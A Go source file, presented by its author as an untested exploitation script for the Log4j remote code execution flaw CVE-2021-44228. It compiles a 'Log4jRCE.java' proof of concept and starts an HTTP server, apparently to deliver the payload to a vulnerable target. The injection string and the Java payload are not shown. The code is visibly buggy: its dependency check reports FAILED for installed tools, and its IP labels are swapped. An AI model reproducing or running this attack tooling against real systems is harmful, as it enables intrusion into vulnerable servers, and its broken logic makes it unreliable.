// exploitation script for the 0-day CVE-2021-44228,
// date: 2021 something
// this code was a rewrite from anothr language
// code idea goes to david bombal, script idea goes to john hammond https://www.youtube.com/watch?v=7qoPDq41xhQ
// this code is written and caught by ArkAngeL43
// https://github.com/ArkAngeL43
// this exploit works by starting http servers
//How can CVE-2021-44228 be exploited? ... If the vulnerable server uses log4j to log requests, the exploit will then request a malicious payload from an attacker-controlled server through the Java Naming and Directory Interface (JNDI) over a variety of services, such as Lightweight Directory Access Protocol (LDAP)
//
// code is mainly thrown together from it really is just unk and something to release lol
// WARNING: THIS CODE HAS NOT BEEN TESTED, YES IT HAS BEEN RUN BUT CURRENT
// OWNER DOES NOT HAVE CONTENT OR RESOURCES TO TEST, DO NOT EXPECT THIS TO WORK
//
// main starts here
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strings"
	"sync/atomic"
	"time"
)

var (
	// flags for the ip
	flagip      = flag.String("target", "", "TARGET IP")
	flaghserver = flag.String("ldap", "", "LDAP server IP")
	flagdtest   = flag.Bool("dt", false, "| Download a sample log4j sample application as a CTF")
	BLU         = "\033[0;94m"
	chex        = "\x1b[H\x1b[2J\x1b[3J"
	BLK         = "\033[0;30m"
	RED         = "\033[0;31m"
	GRN         = "\033[0;32m"
	YEL         = "\033[0;33m"
	MAG         = "\033[0;35m"
	CYN         = "\033[0;36m"
	WHT         = "\033[0;37m"
	listenAddr  string
	healthy     int32
)

// url server eddited from https://gist.github.com/enricofoltran/10b4a980cd07cb02836f70a4ab3e72d7
type key int

const (
	requestIDKey key = 0
)

func main_server() {
	flag.StringVar(&listenAddr, "listen-addr", ":8888", "server listen address")
	flag.Parse()

	logger := log.New(os.Stdout, "http: ", log.LstdFlags)
	fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] \033[32mServer Starting.... ")

	router := http.NewServeMux()
	router.Handle("/", index())
	router.Handle("/healthz", healthz())

	nextRequestID := func() string {
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}

	server := &http.Server{
		Addr:         listenAddr,
		Handler:      tracing(nextRequestID)(logging(logger)(router)),
		ErrorLog:     logger,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  15 * time.Second,
	}

	done := make(chan bool)
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, os.Interrupt)

	go func() {
		<-quit
		logger.Println(WHT, "[", BLU, "INFO", WHT, "] \033[32mServer stopped...")
		atomic.StoreInt32(&healthy, 0)

		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()

		server.SetKeepAlivesEnabled(false)
		if err := server.Shutdown(ctx); err != nil {
			logger.Fatalf("Could not gracefully shutdown the server: %v\n", err)
		}
		close(done)
	}()
	listener_url := "http://localhost" + listenAddr
	fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] Server ready to handel requests on |-> ", listenAddr)
	fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] Server being served at this URL    |-> ", listener_url)

	atomic.StoreInt32(&healthy, 1)
	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		logger.Fatalf("\t\033[37m[ \033[31mINFO \03337m] Could not listen on %s: %v\n", listenAddr, err)
	}

	<-done
	logger.Println(WHT, "\t[", BLU, "INFO", WHT, "] \033[32mServer stopped...")
}

func index() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.Error(w, http.StatusText(http.StatusNotFound), http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.WriteHeader(http.StatusOK)
		fmt.Fprintln(w, "ECHOING REQUESTS WATCH TERMINAL -> ", http.StatusOK)
	})
}

func healthz() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if atomic.LoadInt32(&healthy) == 1 {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		w.WriteHeader(http.StatusServiceUnavailable)
	})
}

func logging(logger *log.Logger) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			defer func() {
				requestID, ok := r.Context().Value(requestIDKey).(string)
				if !ok {
					requestID = "unknown"
				}
				t := time.Now()
				fmt.Println("\t\033[37m[ \033[34mINFO \033[37m] GET Request made at -> ", t.Minute(), ":", t.Second())
				fmt.Println("\t\033[37m[ \033[34mINFO \033[37m] R-ID     |-> ", requestID)
				fmt.Println("\t\033[37m[ \033[34mINFO \033[37m] R-method |-> ", r.Method)
				fmt.Println("\t\033[37m[ \033[34mINFO \033[37m] URL-Path |-> ", r.URL.Path)
				fmt.Println("\t\033[37m[ \033[34mINFO \033[37m] U-AGENT  |-> ", r.UserAgent())
			}()
			next.ServeHTTP(w, r)
		})
	}
}

func tracing(nextRequestID func() string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			requestID := r.Header.Get("X-Request-Id")
			if requestID == "" {
				requestID = nextRequestID()
			}
			ctx := context.WithValue(r.Context(), requestIDKey, requestID)
			w.Header().Set("X-Request-Id", requestID)
			next.ServeHTTP(w, r.WithContext(ctx))
		})
	}
}

// this is why java sucks
func banner() {
	Ascii :=
		`
	 _______        _______                      _____                    
	|    ___|______|    ___|.-----.----.______ _|     |.---.-.--.--.---.-.
	|    ___|______|    ___||  _  |   _|______|       ||  _  |  |  |  _  |
	|___|          |___|    |_____|__|        |_______||___._|\___/|___._|
	`
	fmt.Println(WHT, string(Ascii))
	fmt.Println(MAG, "\tF-For-Java	           Exploit 0-day CVE-2021-44228      V1.0")
	fmt.Println("\t-----------------------------------------------------------------------	")
}

func ce(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// check if IP is real or not using rgex
func validIP4(ipAddress string) bool {
	ipAddress = strings.Trim(ipAddress, " ")

	re, _ := regexp.Compile(`^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$`)
	if re.MatchString(ipAddress) {
		return true
	}
	return false
}

func is_IP(ip string) {
	vIP1 := validIP4(ip)
	if vIP1 == true {
		fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] \033[32mIPV4 TRUE....")
	} else {
		fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] \033[31mIPV4 FALSE....")
	}
}

// compile java
func execc() {
	arg1 := "javac"
	arg2 := "Log4jRCE.java"
	os.Chdir("./poc/")
	newDir, err := os.Getwd()
	if err != nil {
	}
	fmt.Printf("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] \033[0;32mSucessfully changed directories....%s\n", newDir)
	cmd := exec.Command(arg1, arg2)
	stdout, err := cmd.Output()
	ce(err)
	fmt.Print(string(stdout))

}

// check os
func check_os() {
	if runtime.GOOS == "windows" {
		fmt.Println("[ - ] Sorry: This script is linux only")
		os.Exit(1)
	} else {
		fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] \033[0;32mOS Supported...")
	}
}

// line seperation
func sep(sep string) {
	fmt.Println(sep)

}

// clear
func clear(hex string) {
	fmt.Println(hex)
}

// checking cimple connection
func check_network() {
	p, err := http.Get("https://www.google.com")
	ce(err)
	if p.StatusCode <= 100 {
		sep("\n")
		fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] \033[0;31mConnection Might be down...")
	}
	if p.StatusCode >= 200 {
		fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m] \033[0;32mConnection OK...")
	}
}

// check function for commands such as python, python3, javac go etc
func ICA(name string) bool {
	cmd := exec.Command("command", "-v", name) // linux command string argument
	if err := cmd.Run(); err != nil {
		return false
	}
	return true
}

func main_checker(command string) {
	if ICA(command) == true {
		fmt.Println("\t\033[0;37m[ \033[0;91mINFO \033[0;37m]\033[0;31m FAILED!")
	}
	if ICA(command) == false {
		fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m]\033[0;35m", command, "\033[0;32minstalled ")
	}
}

func IP_HOST() {
	flag.Parse()
	if *flagip == "" {
		fmt.Println("\t\033[0;37m[ \033[0;91mINFO \033[0;37m]\033[0;31m FATAL: NO HOST DETECTED TRY |GO RUN MAIN.go -target < IP > | ")
		os.Exit(1)
	}
	if *flaghserver == "" {
		fmt.Println("\t\033[0;37m[ \033[0;91mINFO \033[0;37m]\033[0;31m FATAL: NO HOST DETECTED TRY |GO RUN MAIN.go -target < IP > | ")
		os.Exit(1)
	}
	is_IP(*flagip)
	fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m]\033[0;37m LDAP-IP   |->", *flagip)
	fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m]\033[0;37m TARGET-IP |->", *flaghserver)
}

func main() {
	clear(chex)
	banner()
	check_network()
	check_os()
	IP_HOST()
	fmt.Println("\t\033[0;37m[ \033[0;94mINFO \033[0;37m]\033[0;32m Checking dependancies...")
	main_checker("python3")
	main_checker("python")
	main_checker("javac")
	main_checker("go")
	main_checker("wget")
	execc()
	main_server()
}
